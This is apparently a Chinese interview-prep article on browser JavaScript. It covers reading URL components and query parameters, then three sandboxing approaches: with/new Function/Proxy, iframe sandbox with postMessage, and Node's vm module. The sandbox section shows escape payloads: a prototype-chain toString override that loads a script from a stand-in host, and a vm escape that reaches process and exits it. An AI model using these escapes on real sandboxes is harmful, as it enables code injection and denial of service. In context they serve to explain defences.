# JavaScript 场景题：浏览器与沙箱

## 获取当前页面url

1. window.location.href (设置或获取整个 URL 为字符串)

```jsx
var test = window.location.href;alert(test);//  返回：http://i.cnblogs.com/EditPosts.aspx?opt=1
```

1. window.location.protocol (设置或获取 URL 的协议部分)

```jsx
var test = window.location.protocol;alert(test);//返回：http:
```

1. window.location.host (设置或获取 URL 的主机部分)

```jsx
var test = window.location.host;alert(test);//返回：i.cnblogs.com
```

1. window.location.port (设置或获取与 URL 关联的端口号码)

```jsx
var test = window.location.port;alert(test);//返回：空字符(如果采用默认的80端口 (update:即使添加了:80)，那么返回值并不是默认的80而是空字符)
```

1. window.location.pathname (设置或获取与 URL 的路径部分（就是文件地址）)

```jsx
var test = window.location.pathname;alert(test);//返回：/EditPosts.aspx
```

1. window.location.search (设置或获取 href 属性中跟在问号后面的部分)

```jsx
var test = window.location.search;alert(test);//返回：?opt=1（PS：获得查询（参数）部分，除了给动态语言赋值以外，我们同样可以给静态页面，并使用javascript来获得相信应的参数值。）
```

1. window.location.hash (设置或获取 href 属性中在井号“#”后面的分段)

```jsx
var test = window.location.hash;alert(test);//返回：空字符(因为url中没有)
```

1. js获取url中的参数值*
    
    正则法
    

```jsx
function getQueryString(name) {    var reg = new RegExp('(^|&)' + name + '=([^&]*)(&|$)', 'i');    var r = window.location.search.substr(1).match(reg);    if (r != null) {        return unescape(r[2]);    }    return null;}// 这样调用：alert(GetQueryString("参数名1"));alert(GetQueryString("参数名2"));alert(GetQueryString("参数名3"));
```

split拆分法

```jsx
function GetRequest() {    var url = location.search; //获取url中"?"符后的字串    var theRequest = new Object();    if (url.indexOf("?") != -1) {        var str = url.substr(1);        strs = str.split("&");        for (var i = 0; i < strs.length; i++) {            theRequest[strs[i].split("=")[0]] = unescape(strs[i].split("=")[1]);        }    }    return theRequest;}var Request = new Object();Request = GetRequest();<br>// var id=Request["id"];    // var 参数1,参数2,参数3,参数N;    // 参数1 = Request['参数1'];    // 参数2 = Request['参数2'];    // 参数3 = Request['参数3'];    // 参数N = Request['参数N'];
```

指定取 比如说一个url：[http://i.cnblogs.com/?j=js](https://link.jianshu.com/?t=http://i.cnblogs.com/?j=js), 我们想得到参数j的值，可以通过以下函数调用。

```jsx
function GetQueryString(name) {    var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");    var r = window.location.search.substr(1).match(reg); //获取url中"?"符后的字符串并正则匹配    var context = "";    if (r != null)        context = r[2];    reg = null;    r = null;    return context == null || context == "" || context == "undefined" ? "" : context;}alert(GetQueryString("j"));
```

单个参数的获取方法

```jsx
function GetRequest() {    var url = location.search; //获取url中"?"符后的字串    if (url.indexOf("?") != -1) { //判断是否有参数        var str = url.substr(1); //从第一个字符开始 因为第0个是?号 获取所有除问号的所有符串        strs = str.split("="); //用等号进行分隔 （因为知道只有一个参数        //所以直接用等号进分隔 如果有多个参数 要用&号分隔 再用等号进行分隔）        alert(strs[1]); //直接弹出第一个参数 （如果有多个参数 还要进行循环的）    }}
```


## 沙箱隔离怎么做的什么原理

沙箱，即sandbox，顾名思义，就是让你的程序跑在一个隔离的环境下，不对外界的其他程序造成影响，通过创建类似沙盒的独立作业环境，在其内部运行的程序并不能对硬盘产生永久性的影响。

实现沙箱的三种方法

1. 借助with + new Function

首先从最简陋的方法说起，假如你想要通过eval和function直接执行一段代码，这是不现实的，因为代码内部可以沿着作用域链往上找，篡改全局变量，这是我们不希望的，所以你需要让沙箱内的变量访问都在你的监控范围内；不过，你可以使用with API，在with的块级作用域下，变量访问会优先查找你传入的参数对象，之后再往上找，所以相当于你变相监控到了代码中的“变量访问”：

```jsx
function compileCode(src) {    src = 'with (exposeObj) {' + src + '}'    return new Function('exposeObj', src)}
```

接下里你要做的是，就是暴露可以被访问的变量exposeObj，以及阻断沙箱内的对外访问。通过es6提供的proxy特性，可以获取到对对象上的所有改写：

```jsx
function compileCode(src) {    src = `with (exposeObj) { ${src} }`    return new Function('exposeObj', src)}function proxyObj(originObj) {    let exposeObj = new Proxy(originObj, {        has: (target, key) => {            if (["console", "Math", "Date"].indexOf(key) >= 0) {                return target[key]            }            if (!target.hasOwnProperty(key)) {                throw new Error(`Illegal operation for key ${key}`)            }            return target[key]        },    })    return exposeObj}function createSandbox(src, obj) {    let proxy = proxyObj(obj)    compileCode(src).call(proxy, proxy) //绑定this 防止this访问window}
```

通过设置has函数，可以监听到变量的访问，在上述代码中，仅暴露个别外部变量供代码访问，其余不存在的属性，都会直接抛出error。其实还存在get、set函数，但是如果get和set函数只能拦截到当前对象属性的操作，对外部变量属性的读写操作无法监听到，所以只能使用has函数了。接下来我们测试一下：

```jsx
const testObj = {    value: 1,    a: {        b:    }}createSandbox("value='haha';console.log(a)", testObj)
```

看起来一切似乎没有什么问题，但是问题出在了传入的对象，当调用的是console.log(a.b) 的时候，has方法是无法监听到对b属性的访问的，假设所执行的代码是不可信的，这时候，它只需要通过a.b.**proto** 就可以访问到Object构造函数的原型对象，再对原型对象进行一些篡改，例如将toString就能影响到外部的代码逻辑的。

```jsx
createSandbox(`a.b.__proto__.toString = ()=>{ new (()=>{}).constructor("var script = document.createElement('script'); script.src = 'http://xss.js'; script.type = 'text/javascript'; document.body.appendChild(script);")()}`, testObj)console.log(testObj.a.b.__proto__.toString())
```

例如上面所展示的代码，通过访问原型链的方式，实现了沙箱逃逸，并且篡改了原型链上的toString方法，一旦外部的代码执行了toString方法，就可以实现xss攻击，注入第三方代码；由于在内部定义执行的函数代码逻辑，仍然会沿着作用于链查找，为了绕开作用域链的查找，笔者通过访问箭头函数的constructor的方式拿到了构造函数Function，这个时候，Funtion内所执行的xss代码，在执行的时候，便不会再沿着作用域链往上找，而是直接在全局作用域下执行，通过这样的方式，实现了沙箱逃逸以及xss攻击。

你可能会想，如果我切断原型链的访问，是否就杜绝了呢？的确，你可以通过Object.create(null) 的方式，传入一个不含有原型链的对象，并且让暴露的对象只有一层，不传入嵌套的对象，但是，即使是基本类型值，数字或字符串，同样也可以通过 **proto**查找到原型链，而且，即使不传入对象，你还可以通过下面这种方式绕过：

```jsx
({}).__proto__.toString = () => {    console.log(111)};
```

可见，new Function + with的这种沙箱方式，防君子不防小人，当然，你也可以通过对传入的code代码做代码分析或过滤？假如传入的代码不是按照的规定的数据格式（例如json），就直接抛出错误，阻止恶意代码注入，但这始终不是一种安全的做法。

1. 借助iframe实现沙箱

前面介绍一种劣质的、不怎么安全的方法构造了一个简单的沙箱，但是在前端最常见的方法，还是利用iframe来构造一个沙箱

```jsx
<iframe sandbox src="..."></iframe>
```

但是这也会带来一些限制：

1. script脚本不能执行
2. 不能发送ajax请求
3. 不能使用本地存储，即localStorage,cookie等
4. 不能创建新的弹窗和window
5. 不能发送表单
6. 不能加载额外插件比如flash等
    
    不过别方，你可以对这个iframe标签进行一些配置：
    
    ![](https://www.notion.soJS.assets/3FD065D9D9BD5924FC83D859A251A3C9.png)
    
    img
    

接下里你只需要结合postMessage API，将你需要执行的代码，和需要暴露的数据传递过去，然后和你的iframe页面通信就行了。

1）需要注意的是，在子页面中，要注意不要让执行代码访问到contentWindow对象，因为你需要调用contentWindow的postMessageAPI给父页面传递信息，假如恶意代码也获取到了contentWindow对象，相当于就拿到了父页面的控制权了，这个时候可大事不妙。

2）当使用postMessageAPI的时候，由于sandbox的origin默认为null，需要设置allow-same-origin允许两个页面进行通信，意味着子页面内可以发起请求，这时候需要防范好CSRF，允许了同域请求，不过好在，并没有携带上cookie。

3）当调用postMessageAPI传递数据给子页面的时候，传输的数据对象本身已经通过结构化克隆算法复制

简单的说，通过postMessageAPI传递的对象，已经由浏览器处理过了，原型链已经被切断，同时，传过去的对象也是复制好了的，占用的是不同的内存空间，两者互不影响，所以你不需要担心出现第一种沙箱做法中出现的问题。

1. nodejs中的沙箱

nodejs中使用沙箱很简单，只需要利用原生的vm模块，便可以快速创建沙箱，同时指定上下文。

```jsx
const vm = require('vm');const x = 1;const sandbox = {x: 2};vm.createContext(sandbox); // Contextify the sandbox.const code = 'x += 40; var y = 17;';vm.runInContext(code, sandbox);console.log(sandbox.x); // 42console.log(sandbox.y); // 17console.log(x); // 1;   y is not defined.
```

vm中提供了runInNewContext、runInThisContext、runInContext三个方法，三者的用法有个别出入，比较常用的是runInNewContext和runInContext，可以传入参数指定好上下文对象。

但是vm是绝对安全的吗？不一定。

```jsx
const vm = require('vm');vm.runInNewContext("this.constructor.constructor('return process')().exit()")
```

通过上面这段代码，我们可以通过vm，停止掉主进程nodejs，导致程序不能继续往下执行，这是我们不希望的，解决方案是绑定好context上下文对象，同时，为了避免通过原型链逃逸（nodejs中的对象并没有像浏览器端一样进行结构化复制，导致原型链依然保留），所以我们需要切断原型链，同时对于传入的暴露对象，只提供基本类型值。

```jsx
let ctx = Object.create(null);ctx.a = 1; // ctx上不能包含引用类型的属性vm.runInNewContext("this.constructor.constructor('return process')().exit()", ctx);
```

让我们来看一下TSW中是怎么使用的：

```jsx
const vm = require('vm');const SbFunction = vm.runInNewContext('(Function)', Object.create(null));        // 沙堆...if (opt.jsonpCallback) {    code = `var result=null; var ${opt.jsonpCallback}=function($1){result=$1}; ${responseText}; return result;`;    obj = new SbFunction(code)();}...
```

通过runInNewContext返回沙箱中的构造函数Function，同时传入切断原型链的空对象防止逃逸，之后再外部使用的时候，只需要调用返回的这个函数，和普通的new Function一样调用即可。
